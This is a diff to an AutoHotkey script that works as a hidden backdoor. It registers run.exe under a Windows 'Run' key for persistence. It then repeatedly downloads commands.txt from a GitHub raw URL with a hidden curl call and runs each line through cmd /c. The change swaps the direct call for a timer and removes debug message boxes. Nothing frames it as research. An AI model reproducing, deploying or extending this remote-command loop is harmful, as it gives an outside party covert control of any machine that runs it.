@@ -4,10 +4,6 @@
 path := "C:\Microsoft"
 last := ""
 
-runAllExes()
-
-return
-
 runAllExes() {
     static lastRun := 0
     delay := 1000
@@ -36,19 +32,13 @@ runAllExes() {
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate9"
 
     output := path "\commands.txt"
-    try {
-        original := FileRead(output)
-    } catch {
-    }
     url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
     command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
     RunWait command, , "Hide"
     text := FileRead(output)
-    MsgBox last
-    MsgBox text
     if (last != text) {
-        MsgBox "made it"
-        last := text
+        last := FileRead(output)
+        MsgBox last
         lines := StrSplit(Trim(text), "`n")
         for index, line in lines {
             newCommand := 'cmd /c ' line
@@ -91,3 +81,7 @@ runAllExes() {
         Run output, , "Hide"
     }
 }
+
+SetTimer runAllExes, -1000
+
+return
